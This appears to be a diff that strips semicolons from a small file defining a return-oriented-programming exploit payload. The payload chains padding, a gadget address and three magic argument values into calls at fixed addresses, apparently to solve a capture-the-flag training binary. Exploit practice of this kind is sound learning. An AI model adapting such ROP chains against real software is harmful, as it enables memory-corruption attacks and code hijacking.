@@ -1,25 +1,25 @@
-a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
-b = "bbbbbbbb";
+a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+b = "bbbbbbbb"
 
-placeholder = a b;
+placeholder = a b
 
-zero = 0x00000000;
-zero16 = zero zero;
+zero = 0x00000000
+zero16 = zero zero
 
-gadget = 0x0040093c zero;
+gadget = 0x0040093c zero
 
-callOne = 0x00400720 zero;
-callTwo = 0x00400740 zero;
-callThree = 0x004006f0 zero;
-exitPtr = 0x00400937 zero;
+callOne = 0x00400720 zero
+callTwo = 0x00400740 zero
+callThree = 0x004006f0 zero
+exitPtr = 0x00400937 zero
 
-arg1 = 0xdeadbeefdeadbeef;
-arg2 = 0xcafebabecafebabe;
-arg3 = 0xd00df00dd00df00d;
+arg1 = 0xdeadbeefdeadbeef
+arg2 = 0xcafebabecafebabe
+arg3 = 0xd00df00dd00df00d
 
-args = arg1 arg2 arg3;
-altargs = zero16 zero16 zero16;
+args = arg1 arg2 arg3
+altargs = zero16 zero16 zero16
 
-payload = placeholder gadget args callOne gadget args callTwo gadget args callThree gadget altargs exitPtr;
+payload = placeholder gadget args callOne gadget args callTwo gadget args callThree gadget altargs exitPtr
 
-out = payload;
+out = payload
